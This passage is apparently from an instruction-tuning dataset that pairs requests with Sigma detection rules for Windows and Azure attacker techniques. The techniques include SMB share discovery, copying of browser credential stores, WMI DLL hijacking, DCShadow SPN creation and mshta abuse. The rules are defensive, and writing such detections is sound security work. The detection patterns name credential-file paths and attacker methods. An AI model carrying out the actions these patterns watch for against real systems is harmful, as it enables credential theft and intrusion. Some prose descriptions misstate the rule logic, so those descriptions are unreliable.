    "instruction": "Build a Sigma rule with the goal of detecting Adversaries may look for folders and drives shared on remote systems as a means of identifying sources of information to gather as a precursor for Collection and\nto identify potential systems of interest for Lateral Movement.\nNetworks often contain shared network drives and folders that enable users to access file directories on various systems across a network.\n.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to identify adversaries who are attempting to discover folders and drives shared on remote systems as part of their initial information gathering or to pinpoint potential targets for lateral movement within a network, you should monitor for specific activities within Windows PowerShell modules. Look for any instances where the commands containing 'get-smbshare' are executed. This can indicate an attempt to enumerate SMB shares available on the network, which often serve as shared network drives and folders allowing access to file directories across different systems. These activities can be detected in logs that originate from PowerShell modules, which would typically be part of the Windows product log sources.\n\nIt's important to note, however, that occurrences of these commands may not always signify malicious intent. Administrators or legitimate automated scripts may execute these commands for valid operational reasons, such as routine network maintenance or auditing. Therefore, these detections are considered to have a low level of confidence in indicating malicious activity without additional context. However, continuous monitoring and analysis of these detections, especially in correlation with other suspicious activities, could reveal attempts by adversaries to gather information necessary for further collection of sensitive data or to facilitate lateral movement within the targeted network environment.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    product: windows\n    category: ps_module\n    definition: 0ad03ef1-f21b-4a79-8ce8-e6900c54b65b\ndetection:\n    selection:\n        - Payload|contains: get-smbshare\n        - ContextInfo|contains: get-smbshare\n    condition: selection\nfalsepositives:\n    - Administrator script\nlevel: low\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    product: windows\n    category: ps_module\n    definition: 0ad03ef1-f21b-4a79-8ce8-e6900c54b65b\ndetection:\n    selection:\n        - Payload|contains: get-smbshare\n        - ContextInfo|contains: get-smbshare\n    condition: selection\nfalsepositives:\n    - Administrator script\nlevel: low\n",
      "question": "Adversaries may look for folders and drives shared on remote systems as a means of identifying sources of information to gather as a precursor for Collection and\nto identify potential systems of interest for Lateral Movement.\nNetworks often contain shared network drives and folders that enable users to access file directories on various systems across a network.\n",
      "answer": "In order to identify adversaries who are attempting to discover folders and drives shared on remote systems as part of their initial information gathering or to pinpoint potential targets for lateral movement within a network, you should monitor for specific activities within Windows PowerShell modules. Look for any instances where the commands containing 'get-smbshare' are executed. This can indicate an attempt to enumerate SMB shares available on the network, which often serve as shared network drives and folders allowing access to file directories across different systems. These activities can be detected in logs that originate from PowerShell modules, which would typically be part of the Windows product log sources.\n\nIt's important to note, however, that occurrences of these commands may not always signify malicious intent. Administrators or legitimate automated scripts may execute these commands for valid operational reasons, such as routine network maintenance or auditing. Therefore, these detections are considered to have a low level of confidence in indicating malicious activity without additional context. However, continuous monitoring and analysis of these detections, especially in correlation with other suspicious activities, could reveal attempts by adversaries to gather information necessary for further collection of sensitive data or to facilitate lateral movement within the targeted network environment."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting Adversaries may acquire credentials from web browsers by reading files specific to the target browser.\nWeb browsers commonly save credentials such as website usernames and passwords so that they do not need to be entered manually in the future.\nWeb browsers typically store the credentials in an encrypted format within a credential store.\n.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect activities where adversaries may acquire credentials from web browsers by reading files specific to the target browser, you should be vigilant about several indicators of compromise on Windows operating systems. Monitoring process creation events is crucial for early detection. Specifically, watch for command line statements that include commands such as 'copy-item', 'copy', 'cpi', 'cp', 'move', 'move-item', 'mi', and 'mv'. These commands may indicate an attempt to copy or move files, which could include sensitive information such as browser credentials.\n\nFurther, any processes that are launched where the binary image ends with '\\xcopy.exe' or '\\robocopy.exe' should raise suspicions. Additionally, the OriginalFileName field containing 'XCOPY.EXE' or 'robocopy.exe' in the process creation events should be closely monitored. These tools are legitimate Windows commands that could be misused to facilitate unauthorized copying or moving of files, potentially including encrypted browser credential stores.\n\nThe paths involved in such command-line activities are also telling. Paths containing '\\Opera Software\\Opera Stable\\', '\\Mozilla\\Firefox\\Profiles', '\\Microsoft\\Edge\\User Data\\', and '\\Google\\Chrome\\User Data\\' are particularly relevant. Activities involving these paths may indicate an attempt to access or manipulate web browser data, including saved credentials.\n\nAs with any detection strategy, it's important to be aware of potential false positives. Activities identified through these methods may not always be malicious, as similar actions can be part of legitimate maintenance or user activities. The detection level is considered medium, which means while the activities are indicative of potential credential access attempts, they should be corroborated with additional context to confirm malicious intent.\n\nIn summary, to safeguard against attempts to acquire browser credentials, closely monitor for specific command executions and process creations, especially those involving well-known file manipulation commands and paths associated with web browser user data. This proactive approach towards detection can help in identifying and mitigating potential threats aimed at accessing encrypted credentials stored by web browsers.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_cmd:\n        - CommandLine|contains:\n            - 'copy-item'\n            - 'copy '\n            - 'cpi '\n            - ' cp '\n            - 'move '\n            - 'move-item'\n            - ' mi '\n            - ' mv '\n        - Image|endswith:\n            - '\\xcopy.exe'\n            - '\\robocopy.exe'\n        - OriginalFileName:\n            - 'XCOPY.EXE'\n            - 'robocopy.exe'\n    selection_path:\n        CommandLine|contains:\n            - '\\Opera Software\\Opera Stable\\'\n            - '\\Mozilla\\Firefox\\Profiles'\n            - '\\Microsoft\\Edge\\User Data\\'\n            - '\\Google\\Chrome\\User Data\\'\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\nlevel: medium\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_cmd:\n        - CommandLine|contains:\n            - 'copy-item'\n            - 'copy '\n            - 'cpi '\n            - ' cp '\n            - 'move '\n            - 'move-item'\n            - ' mi '\n            - ' mv '\n        - Image|endswith:\n            - '\\xcopy.exe'\n            - '\\robocopy.exe'\n        - OriginalFileName:\n            - 'XCOPY.EXE'\n            - 'robocopy.exe'\n    selection_path:\n        CommandLine|contains:\n            - '\\Opera Software\\Opera Stable\\'\n            - '\\Mozilla\\Firefox\\Profiles'\n            - '\\Microsoft\\Edge\\User Data\\'\n            - '\\Google\\Chrome\\User Data\\'\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\nlevel: medium\n",
      "question": "Adversaries may acquire credentials from web browsers by reading files specific to the target browser.\nWeb browsers commonly save credentials such as website usernames and passwords so that they do not need to be entered manually in the future.\nWeb browsers typically store the credentials in an encrypted format within a credential store.\n",
      "answer": "In order to detect activities where adversaries may acquire credentials from web browsers by reading files specific to the target browser, you should be vigilant about several indicators of compromise on Windows operating systems. Monitoring process creation events is crucial for early detection. Specifically, watch for command line statements that include commands such as 'copy-item', 'copy', 'cpi', 'cp', 'move', 'move-item', 'mi', and 'mv'. These commands may indicate an attempt to copy or move files, which could include sensitive information such as browser credentials.\n\nFurther, any processes that are launched where the binary image ends with '\\xcopy.exe' or '\\robocopy.exe' should raise suspicions. Additionally, the OriginalFileName field containing 'XCOPY.EXE' or 'robocopy.exe' in the process creation events should be closely monitored. These tools are legitimate Windows commands that could be misused to facilitate unauthorized copying or moving of files, potentially including encrypted browser credential stores.\n\nThe paths involved in such command-line activities are also telling. Paths containing '\\Opera Software\\Opera Stable\\', '\\Mozilla\\Firefox\\Profiles', '\\Microsoft\\Edge\\User Data\\', and '\\Google\\Chrome\\User Data\\' are particularly relevant. Activities involving these paths may indicate an attempt to access or manipulate web browser data, including saved credentials.\n\nAs with any detection strategy, it's important to be aware of potential false positives. Activities identified through these methods may not always be malicious, as similar actions can be part of legitimate maintenance or user activities. The detection level is considered medium, which means while the activities are indicative of potential credential access attempts, they should be corroborated with additional context to confirm malicious intent.\n\nIn summary, to safeguard against attempts to acquire browser credentials, closely monitor for specific command executions and process creations, especially those involving well-known file manipulation commands and paths associated with web browser user data. This proactive approach towards detection can help in identifying and mitigating potential threats aimed at accessing encrypted credentials stored by web browsers."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting threat actor creating a file named `wbemcomn.dll` in the `C:\\Windows\\System32\\wbem\\` directory over the network and loading it for a WMI DLL Hijack scenario..\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect a threat actor creating a file named `wbemcomn.dll` in the `C:\\Windows\\System32\\wbem\\` directory over the network and loading it for a WMI DLL Hijack scenario, you should: Monitor Windows file events for instances where a file is created or modified in the system, specifically looking for actions involving the `System` image and a target filename ending with `\\wbem\\wbemcomn.dll`. This indicates a high likelihood of a WMI DLL Hijacking attempt, which is a critical security threat. It's necessary to keep an eye on this activity as the lack of known false positives suggests that occurrences could likely denote malicious intent.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    product: windows\n    category: file_event\ndetection:\n    selection:\n        Image: System\n        TargetFilename|endswith: '\\wbem\\wbemcomn.dll'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: critical\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    product: windows\n    category: file_event\ndetection:\n    selection:\n        Image: System\n        TargetFilename|endswith: '\\wbem\\wbemcomn.dll'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: critical\n",
      "question": "threat actor creating a file named `wbemcomn.dll` in the `C:\\Windows\\System32\\wbem\\` directory over the network and loading it for a WMI DLL Hijack scenario.",
      "answer": "In order to detect a threat actor creating a file named `wbemcomn.dll` in the `C:\\Windows\\System32\\wbem\\` directory over the network and loading it for a WMI DLL Hijack scenario, you should: Monitor Windows file events for instances where a file is created or modified in the system, specifically looking for actions involving the `System` image and a target filename ending with `\\wbem\\wbemcomn.dll`. This indicates a high likelihood of a WMI DLL Hijacking attempt, which is a critical security threat. It's necessary to keep an eye on this activity as the lack of known false positives suggests that occurrences could likely denote malicious intent."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting use of rar.exe, on the command line, to create an archive with password protection or with a specific compression level. This is pretty indicative of malicious actions..\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect the use of rar.exe, on the command line, to create an archive with password protection or with a specific compression level, which is pretty indicative of malicious actions, you should: Monitor Windows process creation logs for occurrences of command line executions involving rar.exe with specific command-line arguments. Look for the use of '-hp' in the command line, which is used to add password protection to an archive. Additionally, be alert for the use of '-m' or ' a ' in the command line, which indicates setting a specific compression level for the archive. Both conditions must be met for an alert to be generated. Be aware, however, that there might be legitimate uses of these command-line flags with Winrar or other command-line tools, which could result in false positives. The alert generated from this detection is considered high level, signifying a strong indicator of potentially malicious activity involving compressed files.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_password:\n        CommandLine|contains: ' -hp'\n    selection_other:\n        CommandLine|contains:\n            - ' -m'\n            - ' a '\n    condition: selection_password and selection_other\nfalsepositives:\n    - Legitimate use of Winrar command line version\n    - Other command line tools, that use these flags\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_password:\n        CommandLine|contains: ' -hp'\n    selection_other:\n        CommandLine|contains:\n            - ' -m'\n            - ' a '\n    condition: selection_password and selection_other\nfalsepositives:\n    - Legitimate use of Winrar command line version\n    - Other command line tools, that use these flags\nlevel: high\n",
      "question": "use of rar.exe, on the command line, to create an archive with password protection or with a specific compression level. This is pretty indicative of malicious actions.",
      "answer": "In order to detect the use of rar.exe, on the command line, to create an archive with password protection or with a specific compression level, which is pretty indicative of malicious actions, you should: Monitor Windows process creation logs for occurrences of command line executions involving rar.exe with specific command-line arguments. Look for the use of '-hp' in the command line, which is used to add password protection to an archive. Additionally, be alert for the use of '-m' or ' a ' in the command line, which indicates setting a specific compression level for the archive. Both conditions must be met for an alert to be generated. Be aware, however, that there might be legitimate uses of these command-line flags with Winrar or other command-line tools, which could result in false positives. The alert generated from this detection is considered high level, signifying a strong indicator of potentially malicious activity involving compressed files."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting conditional access changes..\nMore specifically, the Sigma rule should work as follows:\n\nIn order to monitor and alert on conditional access changes, you should focus on the audit logs from Azure products. Specifically, keep an eye out for logs that record the message \"Add conditional access policy\". This action could indicate an attempt to modify access controls, which can impact the security posture of your environment. However, be mindful of potential false positives which might arise from misconfigured role permissions or legitimate but unexpected changes from certain users, user agents, or hostnames in your environment. The significance of these logs are considered to be of medium level, suggesting that while they are important to track, they should be contextualized within the broader security operations of your organization.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    product: azure\n    service: auditlogs\ndetection:\n    selection:\n        properties.message: Add conditional access policy\n    condition: selection\nfalsepositives:\n    - Misconfigured role permissions\n    - Verify whether the user identity, user agent, and/or hostname should be making changes in your environment.\nlevel: medium\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    product: azure\n    service: auditlogs\ndetection:\n    selection:\n        properties.message: Add conditional access policy\n    condition: selection\nfalsepositives:\n    - Misconfigured role permissions\n    - Verify whether the user identity, user agent, and/or hostname should be making changes in your environment.\nlevel: medium\n",
      "question": "conditional access changes.",
      "answer": "In order to monitor and alert on conditional access changes, you should focus on the audit logs from Azure products. Specifically, keep an eye out for logs that record the message \"Add conditional access policy\". This action could indicate an attempt to modify access controls, which can impact the security posture of your environment. However, be mindful of potential false positives which might arise from misconfigured role permissions or legitimate but unexpected changes from certain users, user agents, or hostnames in your environment. The significance of these logs are considered to be of medium level, suggesting that while they are important to track, they should be contextualized within the broader security operations of your organization."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting Once established within a system or network, an adversary may use automated techniques for collecting internal data..\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect automated techniques used by adversaries for collecting internal data once they have established themselves within a system or network, you should monitor process creation logs on Windows systems. Specifically, lookout for processes that are initiated with command lines containing file extensions typically associated with documents and data files, such as '.doc', '.docx', '.xls', '.xlsx', '.ppt', '.pptx', '.rtf', '.pdf', and '.txt'. These processes might indicate an attempt to gather or manipulate documents containing sensitive information.\n\nAdditionally, pay attention to command lines that include patterns suggesting the use of directory listing commands followed by switches like 'dir', '/b', and '/s'. This combination specifies a bare format listing of files, including subdirectories, which can be a method to enumerate files in preparation for exfiltration or further manipulation.\n\nAlso, be vigilant about processes involving the use of 'FINDSTR.EXE', especially when the command line includes switches like '/e' and '/si', indicating an effort to find strings in files with case-insensitive searches, potentially to locate specific data sets within files.\n\nThese detection strategies are tagged with techniques associated with discovery and collection, which might be a part of adversarial tactics like Credential Access, Discovery, Lateral Movement, Collection, and Exfiltration, aimed at gathering sensitive information post-compromise. While there may be unknown false positives, the level of threat is considered medium, indicating a need for monitoring these activities to prevent data loss or further compromise.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_ext:\n        CommandLine|contains:\n            - '.doc'\n            - '.docx'\n            - '.xls'\n            - '.xlsx'\n            - '.ppt'\n            - '.pptx'\n            - '.rtf'\n            - '.pdf'\n            - '.txt'\n    selection_other_dir:\n        CommandLine|contains|all:\n            - 'dir '\n            - ' /b '\n            - ' /s '\n    selection_other_findstr:\n        OriginalFileName: 'FINDSTR.EXE'\n        CommandLine|contains:\n            - ' /e '\n            - ' /si '\n    condition: selection_ext and 1 of selection_other_*\nfalsepositives:\n    - Unknown\nlevel: medium\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_ext:\n        CommandLine|contains:\n            - '.doc'\n            - '.docx'\n            - '.xls'\n            - '.xlsx'\n            - '.ppt'\n            - '.pptx'\n            - '.rtf'\n            - '.pdf'\n            - '.txt'\n    selection_other_dir:\n        CommandLine|contains|all:\n            - 'dir '\n            - ' /b '\n            - ' /s '\n    selection_other_findstr:\n        OriginalFileName: 'FINDSTR.EXE'\n        CommandLine|contains:\n            - ' /e '\n            - ' /si '\n    condition: selection_ext and 1 of selection_other_*\nfalsepositives:\n    - Unknown\nlevel: medium\n",
      "question": "Once established within a system or network, an adversary may use automated techniques for collecting internal data.",
      "answer": "In order to detect automated techniques used by adversaries for collecting internal data once they have established themselves within a system or network, you should monitor process creation logs on Windows systems. Specifically, lookout for processes that are initiated with command lines containing file extensions typically associated with documents and data files, such as '.doc', '.docx', '.xls', '.xlsx', '.ppt', '.pptx', '.rtf', '.pdf', and '.txt'. These processes might indicate an attempt to gather or manipulate documents containing sensitive information.\n\nAdditionally, pay attention to command lines that include patterns suggesting the use of directory listing commands followed by switches like 'dir', '/b', and '/s'. This combination specifies a bare format listing of files, including subdirectories, which can be a method to enumerate files in preparation for exfiltration or further manipulation.\n\nAlso, be vigilant about processes involving the use of 'FINDSTR.EXE', especially when the command line includes switches like '/e' and '/si', indicating an effort to find strings in files with case-insensitive searches, potentially to locate specific data sets within files.\n\nThese detection strategies are tagged with techniques associated with discovery and collection, which might be a part of adversarial tactics like Credential Access, Discovery, Lateral Movement, Collection, and Exfiltration, aimed at gathering sensitive information post-compromise. While there may be unknown false positives, the level of threat is considered medium, indicating a need for monitoring these activities to prevent data loss or further compromise."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting Adversaries may employ various system checks to detect and avoid virtualization and analysis environments.\nThis may include changing behaviors based on the results of checks for the presence of artifacts indicative of a virtual machine environment (VME) or sandbox\n.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect adversaries who employ various system checks to avoid virtualization and analysis environments, you should focus on monitoring PowerShell scripts within Windows environments. It is essential that Script Block Logging is enabled to capture the PowerShell script activities accurately. The detection strategy involves looking for scripts that contain keywords indicative of system information queries, specifically those that use PowerShell commands like `Get-WmiObject` or its alias `gwmi`. Additionally, scripts querying for specific system information such as `MSAcpi_ThermalZoneTemperature` or `Win32_ComputerSystem` are also red flags. These particular queries are often used by adversaries to gather information about the system, which can help them determine if an analysis or virtualized environment is present, thus enabling them to change their behavior to avoid detection. The detection strategy encompasses monitoring all these elements. Although the potential for false positives exists, the severity level for such detections is considered medium, indicating a balanced approach towards identifying malicious activity without overwhelming the analysts with benign alerts.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    product: windows\n    category: ps_script\n    definition: 'Requirements: Script Block Logging must be enabled'\ndetection:\n    selection_action:\n        ScriptBlockText|contains:\n            - Get-WmiObject\n            - gwmi\n    selection_module:\n        ScriptBlockText|contains:\n            - MSAcpi_ThermalZoneTemperature\n            - Win32_ComputerSystem\n    condition: all of selection*\nfalsepositives:\n    - Unknown\nlevel: medium\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    product: windows\n    category: ps_script\n    definition: 'Requirements: Script Block Logging must be enabled'\ndetection:\n    selection_action:\n        ScriptBlockText|contains:\n            - Get-WmiObject\n            - gwmi\n    selection_module:\n        ScriptBlockText|contains:\n            - MSAcpi_ThermalZoneTemperature\n            - Win32_ComputerSystem\n    condition: all of selection*\nfalsepositives:\n    - Unknown\nlevel: medium\n",
      "question": "Adversaries may employ various system checks to detect and avoid virtualization and analysis environments.\nThis may include changing behaviors based on the results of checks for the presence of artifacts indicative of a virtual machine environment (VME) or sandbox\n",
      "answer": "In order to detect adversaries who employ various system checks to avoid virtualization and analysis environments, you should focus on monitoring PowerShell scripts within Windows environments. It is essential that Script Block Logging is enabled to capture the PowerShell script activities accurately. The detection strategy involves looking for scripts that contain keywords indicative of system information queries, specifically those that use PowerShell commands like `Get-WmiObject` or its alias `gwmi`. Additionally, scripts querying for specific system information such as `MSAcpi_ThermalZoneTemperature` or `Win32_ComputerSystem` are also red flags. These particular queries are often used by adversaries to gather information about the system, which can help them determine if an analysis or virtualized environment is present, thus enabling them to change their behavior to avoid detection. The detection strategy encompasses monitoring all these elements. Although the potential for false positives exists, the severity level for such detections is considered medium, indicating a balanced approach towards identifying malicious activity without overwhelming the analysts with benign alerts."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting creation of the Process Explorer drivers by processes other than Process Explorer (procexp) itself.\nHack tools or malware may use the Process Explorer driver to elevate privileges, drops it to disk for a few moments, runs a service using that driver and removes it afterwards.\n.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect the creation of the Process Explorer drivers by processes other than Process Explorer (procexp) itself, where hack tools or malware may use the Process Explorer driver to elevate privileges, drops it to disk for a few moments, runs a service using that driver, and removes it afterwards, you should: focus on monitoring file events within Windows environments. Specifically, look for any file creation activities where the target filename includes '\\PROCEXP' or ends with '.sys'. However, it's important to exclude any events where the process creating these files is 'procexp.exe' or 'procexp64.exe', as these are legitimate Process Explorer processes. Moreover, be aware that there might be some false positives, especially in cases where legitimate binaries of the Process Explorer have been renamed. This approach is crucial in identifying malicious activities associated with privilege escalation tactics, where adversaries might attempt to exploit the capabilities of trusted system drivers. Identifying such activities requires high vigilance due to the sophisticated nature of the attack.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    product: windows\n    category: file_event\ndetection:\n    selection:\n        TargetFilename|contains: '\\PROCEXP'\n        TargetFilename|endswith: '.sys'\n    filter_main_process_explorer:\n        Image|endswith:\n            - '\\procexp.exe'\n            - '\\procexp64.exe'\n    condition: selection and not 1 of filter_main_*\nfalsepositives:\n    - Some false positives may occur with legitimate renamed process explorer binaries\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    product: windows\n    category: file_event\ndetection:\n    selection:\n        TargetFilename|contains: '\\PROCEXP'\n        TargetFilename|endswith: '.sys'\n    filter_main_process_explorer:\n        Image|endswith:\n            - '\\procexp.exe'\n            - '\\procexp64.exe'\n    condition: selection and not 1 of filter_main_*\nfalsepositives:\n    - Some false positives may occur with legitimate renamed process explorer binaries\nlevel: high\n",
      "question": "creation of the Process Explorer drivers by processes other than Process Explorer (procexp) itself.\nHack tools or malware may use the Process Explorer driver to elevate privileges, drops it to disk for a few moments, runs a service using that driver and removes it afterwards.\n",
      "answer": "In order to detect the creation of the Process Explorer drivers by processes other than Process Explorer (procexp) itself, where hack tools or malware may use the Process Explorer driver to elevate privileges, drops it to disk for a few moments, runs a service using that driver, and removes it afterwards, you should: focus on monitoring file events within Windows environments. Specifically, look for any file creation activities where the target filename includes '\\PROCEXP' or ends with '.sys'. However, it's important to exclude any events where the process creating these files is 'procexp.exe' or 'procexp64.exe', as these are legitimate Process Explorer processes. Moreover, be aware that there might be some false positives, especially in cases where legitimate binaries of the Process Explorer have been renamed. This approach is crucial in identifying malicious activities associated with privilege escalation tactics, where adversaries might attempt to exploit the capabilities of trusted system drivers. Identifying such activities requires high vigilance due to the sophisticated nature of the attack."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting DCShadow via create new SPN.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect DCShadow via the creation of a new Service Principal Name (SPN), you should monitor for specific events within the Windows Security event logs. This involves keeping an eye on events related to changes in directory services, specifically when new SPNs are created or modified that start with 'GC/'. The monitoring process targets two main Event IDs: 4742 and 5136.\n\nFor Event ID 4742, the focus is on detecting any alterations to ServicePrincipalNames that contain the prefix 'GC/', which can indicate the registration of new services in the domain. This is significant because attackers can manipulate SPNs to emulate legitimate services or to escalate privileges within a domain, particularly in attacks like DCShadow, where a malicious domain controller is simulated.\n\nThe second crucial Event ID to monitor is 5136. This event signifies changes to objects within the directory services, and you should look specifically for alterations where the AttributeLDAPDisplayName equals 'servicePrincipalName' and the AttributeValue starts with 'GC/'. This combination of criteria helps to narrow down the detection to scenarios where SPNs are likely being manipulated for malicious purposes.\n\nIt's important to note while monitoring these events that valid activities conducted on domain controllers can generate them. Therefore, it's advisable to configure exclusions for known domain controllers to reduce the occurrence of false positives. \n\nBy focusing on these detection strategies, connected to the modification or creation of SPNs that resemble domain controllers (indicated by the 'GC/' prefix), you can effectively spot potential DCShadow attacks. This approach ultimately relies on configuring and analyzing the \"Audit Directory Service Changes\" logging policy, emphasizing objects with system access control lists (SACLs) and their interactions in alignment with their SACL settings. This method aids in the early detection of adversarial tactics aimed at domain control or privilege escalation.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    product: windows\n    service: security\n    definition: The \"Audit Directory Service Changes\" logging policy must be configured in order to receive events. Audit events are generated only for objects with configured system access control lists (SACLs). Audit events are generated only for objects with configured system access control lists (SACLs) and only when accessed in a manner that matches their SACL settings. This policy covers the following events ids - 5136, 5137, 5138, 5139, 5141. Note that the default policy does not cover User objects. For that a custom AuditRule need to be setup (See https://github.com/OTRF/Set-AuditRule)\ndetection:\n    selection1:\n        EventID: 4742\n        ServicePrincipalNames|contains: 'GC/'\n    selection2:\n        EventID: 5136\n        AttributeLDAPDisplayName: servicePrincipalName\n        AttributeValue|startswith: 'GC/'\n    condition: 1 of selection*\nfalsepositives:\n    - Valid on domain controllers; exclude known DCs\nlevel: medium\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    product: windows\n    service: security\n    definition: The \"Audit Directory Service Changes\" logging policy must be configured in order to receive events. Audit events are generated only for objects with configured system access control lists (SACLs). Audit events are generated only for objects with configured system access control lists (SACLs) and only when accessed in a manner that matches their SACL settings. This policy covers the following events ids - 5136, 5137, 5138, 5139, 5141. Note that the default policy does not cover User objects. For that a custom AuditRule need to be setup (See https://github.com/OTRF/Set-AuditRule)\ndetection:\n    selection1:\n        EventID: 4742\n        ServicePrincipalNames|contains: 'GC/'\n    selection2:\n        EventID: 5136\n        AttributeLDAPDisplayName: servicePrincipalName\n        AttributeValue|startswith: 'GC/'\n    condition: 1 of selection*\nfalsepositives:\n    - Valid on domain controllers; exclude known DCs\nlevel: medium\n",
      "question": "DCShadow via create new SPN",
      "answer": "In order to detect DCShadow via the creation of a new Service Principal Name (SPN), you should monitor for specific events within the Windows Security event logs. This involves keeping an eye on events related to changes in directory services, specifically when new SPNs are created or modified that start with 'GC/'. The monitoring process targets two main Event IDs: 4742 and 5136.\n\nFor Event ID 4742, the focus is on detecting any alterations to ServicePrincipalNames that contain the prefix 'GC/', which can indicate the registration of new services in the domain. This is significant because attackers can manipulate SPNs to emulate legitimate services or to escalate privileges within a domain, particularly in attacks like DCShadow, where a malicious domain controller is simulated.\n\nThe second crucial Event ID to monitor is 5136. This event signifies changes to objects within the directory services, and you should look specifically for alterations where the AttributeLDAPDisplayName equals 'servicePrincipalName' and the AttributeValue starts with 'GC/'. This combination of criteria helps to narrow down the detection to scenarios where SPNs are likely being manipulated for malicious purposes.\n\nIt's important to note while monitoring these events that valid activities conducted on domain controllers can generate them. Therefore, it's advisable to configure exclusions for known domain controllers to reduce the occurrence of false positives. \n\nBy focusing on these detection strategies, connected to the modification or creation of SPNs that resemble domain controllers (indicated by the 'GC/' prefix), you can effectively spot potential DCShadow attacks. This approach ultimately relies on configuring and analyzing the \"Audit Directory Service Changes\" logging policy, emphasizing objects with system access control lists (SACLs) and their interactions in alignment with their SACL settings. This method aids in the early detection of adversarial tactics aimed at domain control or privilege escalation."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting suspicious mshta process execution patterns.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect suspicious mshta process execution patterns, you should monitor process creation events on Windows systems for specific conditions indicating potential misuse of the Microsoft HTML Application Host (mshta.exe). Focus on activities where the process image ends with '\\mshta.exe' or the original filename is identified exactly as 'MSHTA.EXE'. It's essential to scrutinize instances where this process is initiated by parent processes commonly abused in attacks, such as 'cmd.exe', 'cscript.exe', 'powershell.exe', 'pwsh.exe', 'regsvr32.exe', 'rundll32.exe', and 'wscript.exe'. These parent processes raise the alarm about possible script or command execution attacks aiming to bypass security measures.\n\nAdditionally, pay attention to commands that involve suspicious directories like '\\AppData\\Local\\', 'C:\\ProgramData\\', 'C:\\Users\\Public\\', and 'C:\\Windows\\Temp\\'. These locations are frequently used by attackers to execute malicious scripts or drop malware due to less stringent permissions or to evade detection. Furthermore, filter out legitimate execution paths from 'C:\\Windows\\System32\\' and 'C:\\Windows\\SysWOW64\\' to reduce false positives, while also being vigilant for command lines containing file extensions '.htm' and '.hta' that are typically associated with HTML applications and scripts, excluding those that simply end with 'mshta.exe' or 'mshta' to avoid catching regular program executions.\n\nThe condition for raising an alert is met if all the specified criteria in selections for suspicious parent processes or folders are observed or if there's an execution of 'mshta.exe' that doesn't fit the filtered-out legitimate use cases. The detection of such patterns is critical given the high risk associated with the tactics and techniques employed that may include execution, persistence, privilege escalation, defense evasion, among others, linked with the abuse of mshta.exe in the context of an attack.",
    "context": "",
